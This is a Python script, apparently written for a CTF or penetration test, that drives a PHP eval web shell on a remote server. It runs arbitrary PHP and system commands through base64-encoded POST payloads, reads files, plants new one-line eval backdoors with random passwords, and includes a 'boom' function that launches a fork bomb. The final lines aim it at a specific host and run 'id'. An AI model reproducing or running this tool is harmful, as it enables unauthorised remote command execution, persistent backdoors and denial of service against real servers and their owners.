__author__ = 'nlfox'
import requests
import base64
import re


class PHPShell:
    def __init__(self, url, passwd):
        self.url = url
        self.passwd = passwd

    def genRandomPsw(self):
        import hashlib
        import time
        return hashlib.md5(self.url + str(time.time())).hexdigest()

    def eval(self, code):
        resText = requests.post(self.url, data={
            self.passwd: "eval(base64_decode($_POST['p1']));",
            "p1": base64.b64encode(
                "@ini_set(\"display_errors\",\"0\");@set_time_limit(0);@set_magic_quotes_runtime(0);echo '->|';" + code + "echo '|<-';")
        }).text
        resText = re.findall(r'\-\>\|(.*?)\|\<\-', resText, re.DOTALL)[0]
        return resText

    def execCmd(self, cmd):
        payload = 'system("%s");' % (cmd)
        return self.eval(payload)

    def getContents(self, url):
        payload = """
        echo file_get_contents('%s');
        """.strip() % (url)
        return self.eval(payload)

    def getCurPwd(self):
        payload = """
        echo getcwd();
        """.strip()
        return self.eval(payload)

    def getShell(self, filepath="data.php", password="test233", randomPwd=False, saveFile=True):
        if saveFile:
            import time
            f = open(str(time.time()) + '.log','w')
        if randomPwd:
            password = self.genRandomPsw()
        payload = """<?php @eval($_POST["%s"])?>
        """.strip() % (password)
        self.writeFile(filepath, payload)
        print 'url is ', self.getUrlDir() + filepath
        print 'password is ', password
        if saveFile:
            f.write('url is '+self.getUrlDir() + filepath)
            f.write('password is '+ password)
        return (self.getUrlDir() + filepath, password)

    def writeFile(self, path, content):
        payload = """
        file_put_contents('%s','%s');
        """.strip() % (path, content)
        return self.eval(payload)

    def getUrlDir(self):
        urlArr = (str(self.url).split('/'))
        urlArr.pop()
        return '/'.join(urlArr) + '/'

    def boom(self):
        self.execCmd("bash -c '.(){ .|.& };.'")


s = PHPShell('http://7851f74111100e0a9.jie.sangebaimao.com/.git/data.php', 'test233')
s.eval('system("id");')
